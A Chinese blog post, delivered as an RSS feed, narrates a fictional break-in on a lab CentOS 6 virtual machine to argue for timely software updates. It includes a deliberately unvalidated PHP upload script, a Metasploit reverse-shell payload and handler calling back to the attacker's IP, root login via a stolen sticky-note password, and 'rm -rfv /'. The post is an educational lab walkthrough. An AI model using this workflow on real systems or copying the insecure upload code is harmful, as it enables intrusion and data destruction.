<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>更新 - 标签 - WeepingDogel 的博客</title>
        <link>http://weepingdogel.github.io/zh-cn/tags/%E6%9B%B4%E6%96%B0/</link>
        <description>更新 - 标签 - WeepingDogel 的博客</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>weepingdogel@gmail.com (WeepingDogel)</managingEditor>
            <webMaster>weepingdogel@gmail.com (WeepingDogel)</webMaster><lastBuildDate>Sat, 26 Sep 2020 13:14:18 &#43;0800</lastBuildDate><atom:link href="http://weepingdogel.github.io/zh-cn/tags/%E6%9B%B4%E6%96%B0/" rel="self" type="application/rss+xml" /><item>
    <title>攻击 CentOS6 虚拟机</title>
    <link>http://weepingdogel.github.io/zh-cn/posts/2020-09-26/</link>
    <pubDate>Sat, 26 Sep 2020 13:14:18 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/zh-cn/posts/2020-09-26/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg" referrerpolicy="no-referrer">
            </div><blockquote>
<p>虽然存在渗透过程，但是本篇主题不是渗透，请理性阅读。</p>
</blockquote>
<h2 id="序">序</h2>
<p>最近总听到一些声音。</p>
<p>一些关于软件更新的、不同的声音。</p>
<p>一边说：在某些情况下，更新不好，会带来不必要的工作量，甚至重写</p>
<p>另一边说：持续不断的更新才能带来更好的体验</p>
<p>我不知道哪一边是对的，但有点好奇</p>
<p>我好奇如果不更新会怎样，所以我做了这件事：用虚拟机模拟一个商业公司的服务器，系统为 CentOS 6，尝试使用一些工具试着去攻击。</p>
<p>只是想模拟一家公司在 2020 年使用 CentOS 6.0 被黑客盯上了会怎么样。</p>
<h2 id="模拟环境">模拟环境</h2>
<blockquote>
<p>攻击者平台: Arch Linux</p>
<p>IP: 192.168.0.109</p>
<p>受害平台: CentOS 6.1 on VirtualBox</p>
<p>IP: 192.168.0.116</p>
</blockquote>
<p><strong>假如</strong>这是一家由非技术人员领导技术人员的公司，很长一段时间没有更新过开发时使用的软件（包括开发机、服务器的操作系统）</p>
<p>我们将这个虚拟机想象为他们的服务器，然后进行一些攻击测试。</p>
<p>由于这家公司的管理层是非技术人员，因此服务器的软件不仅版本老旧，且缺乏防御措施。</p>
<p>外加公司有点不尽人意的工时，程序员们都以“完成任务”的摸鱼态度工作，导致后端 PHP 写成了这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;错误：&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;上传文件名: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件类型: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;type&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件大小: &#34;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34; kB&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件临时存储的位置: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件存储在: &#34;</span> <span class="o">.</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>由于条件有限，只能模拟到这个程度，但我个人认为<del>足以进行抽象测试了</del>(逃</p>
</blockquote>
<h2 id="攻击过程">攻击过程</h2>
<p>总有人喜欢搞破坏，一名黑客对服务器进行了扫描&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -O -v 192.168.0.116
</span></span></code></pre></td></tr></table>
</div>
</div><p>结果是这样的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Nmap scan report for 192.168.0.116
</span></span><span class="line"><span class="cl">Host is up (0.00028s latency).
</span></span><span class="line"><span class="cl">Not shown: 998 closed ports
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:B7:2E:E5 (Oracle VirtualBox virtual NIC)
</span></span><span class="line"><span class="cl">Device type: general purpose
</span></span><span class="line"><span class="cl">Running: Linux 2.6.X|3.X
</span></span><span class="line"><span class="cl">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
</span></span><span class="line"><span class="cl">OS details: Linux 2.6.32 - 3.10
</span></span><span class="line"><span class="cl">Uptime guess: 49.708 days (since Sat Aug  8 02:56:12 2020)
</span></span><span class="line"><span class="cl">Network Distance: 1 hop
</span></span><span class="line"><span class="cl">TCP Sequence Prediction: Difficulty=261 (Good luck!)
</span></span><span class="line"><span class="cl">IP ID Sequence Generation: All zeros
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
</span></span><span class="line"><span class="cl">           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
</span></span></code></pre></td></tr></table>
</div>
</div><p>他惊讶地发现内核版本居然才 <code>2.6.32</code>，这样的事他还是第一次见。</p>
<p>除此之外，开放的端口有 SSH 、 HTTP ，这给了他很好的机会。</p>
<p>他试图访问了网站，在网站上发现了一个文件上传点。</p>
<p></p>
<p>抱着试试看的态度，用 msf 生成了一个 payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.109 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o shell.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>选择了文件，点击上传惊奇地发现，不止上传成功，还被告知了位置
</p>
<p>于是他启动了 <code>msfconsole</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p>并使用  <code>exploit/multi/handler</code> 这个模块</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 &gt; use exploit/multi/handler 
</span></span></code></pre></td></tr></table>
</div>
</div><p>依次设置好参数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; set LHOST 192.168.0.109
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; set LPORT 4444
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set payload php/meterpreter/reverse_tcp
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后一步就是运行模块了，</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; run
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后 msf 开始监听。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.0.109:4444 
</span></span></code></pre></td></tr></table>
</div>
</div><p>这时他将提示出的文件地址和链接改一下，并访问</p>
<blockquote>
<p><code>http://192.168.0.116/upload/shell.php</code></p>
</blockquote>
<p>msf 立刻就有了结果，可想而知，服务器的安全措施有多差</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.0.109:4444 
</span></span><span class="line"><span class="cl">[*] Sending stage (38288 bytes) to 192.168.0.116
</span></span><span class="line"><span class="cl">[*] Meterpreter session 1 opened (192.168.0.109:4444 -&gt; 192.168.0.116:52350) at 2020-09-26 21:33:06 +0800
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>现在他开始获取系统简要信息</p>
<ul>
<li>系统、内核版本</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; sysinfo
</span></span><span class="line"><span class="cl">Computer    : localhost
</span></span><span class="line"><span class="cl">OS          : Linux localhost 2.6.32-754.33.1.el6.x86_64 #1 SMP Tue Aug 25 15:29:40 UTC 2020 x86_64
</span></span><span class="line"><span class="cl">Meterpreter : php/linux
</span></span><span class="line"><span class="cl">meterpreter &gt; cat /etc/issue
</span></span><span class="line"><span class="cl">CentOS release 6.10 (Final)
</span></span><span class="line"><span class="cl">Kernel \r on an \m
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>当前控制的用户权限</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; getuid
</span></span><span class="line"><span class="cl">Server username: apache (48)
</span></span></code></pre></td></tr></table>
</div>
</div><p>权限还是很低的，尽管无法做一些让公司损失大的事情，但至少能够偷窥和搞破坏了，不过黑客会就此满足吗？ 答案是不会，因为他还想要提权，获取 root 权限，这样便能为所欲为了。</p>
<p>由于这台服务器的系统与内核过于老旧，大多数复现漏洞的代码要么只在3.x 以上的内核版本中有效，要么无法编译。</p>
<p>看起来他需要想想其他办法。</p>
<p>他在白天骑着摩托穿街过巷送外卖，夜晚则是游走网络间的黑客。</p>
<p>一次偶然的机会，他去送那个公司的员工订的外卖，进入办公区时，无意之间看到贴在显示器上的便签。</p>
<p>上面写着一些数字和字母，也许是什么有用的东西。</p>
<p>趁着员工们用餐，他用手机偷偷将便签拍了下来便离开了。</p>
<p>比较巧的是，这张便签是刚换的密码，需要再隔一段时间才会更改。</p>
<p>下班后回到终端，尝试着用偷窥来的密码直接登陆 root</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; shell
</span></span><span class="line"><span class="cl">Process 1376 created.
</span></span><span class="line"><span class="cl">Channel 2 created.
</span></span></code></pre></td></tr></table>
</div>
</div><p>获得交互 shell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/bin/sh -i
</span></span><span class="line"><span class="cl">sh: no job control in this shell
</span></span><span class="line"><span class="cl">sh-4.1$ python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span><span class="line"><span class="cl">python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span><span class="line"><span class="cl">bash-4.1$ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>进行登录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">bash-4.1$ su root
</span></span><span class="line"><span class="cl">su root
</span></span><span class="line"><span class="cl">Password: ************
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[root@localhost upload]# 
</span></span></code></pre></td></tr></table>
</div>
</div><p>可见，一口气便登录成功，root 权限到了他的手里。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[root@localhost upload]# whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl">[root@localhost upload]# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0
</span></span><span class="line"><span class="cl">[root@localhost upload]# 
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来他便可以为所欲为了..</p>
<p>对，他最后进行了删库</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[root@localhost upload]# rm -rfv /
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后导致公司损失巨大..</p>
<h2 id="结语">结语</h2>
<p>虽然以上的故事纯属虚构，攻击也只是在模拟环境进行的。</p>
<p>但却值得我们思考，就我们能看到的来看&hellip;</p>
<ul>
<li>系统不更新容易被攻击</li>
<li>代码不更新容易出漏洞</li>
<li>密码更新太慢容易泄露</li>
<li>漏洞以更新来修复，不修则被利用</li>
</ul>
<p>而我们看不到的&hellip;</p>
<p>软件终究是人所创造的，人尚无完美者，需要不断反省自己，思考自己，何况是所造之物？</p>
<p>不论作为用户开始开发者，更新自己应该更新的东西是再正常不过的事情了，只不过有快慢之别，但不论快慢，总得前进，迟早都要往前走的。</p>
<p>而不能站立不动甚至往回走。</p>
<p>物之更新如人之反省，人不知反省，前途渺茫，物不被更新，受人遗弃。</p>
<p>甚至是，像看到我刚刚讲的笑话那样，被一个送外卖的脚本小子轻松破坏掉了..</p>
<p>以上，只是个人想法，若有不当之处，请在下面的评论插件中 <del>喷我</del> 纠正。</p>]]></description>
</item></channel>
</rss>
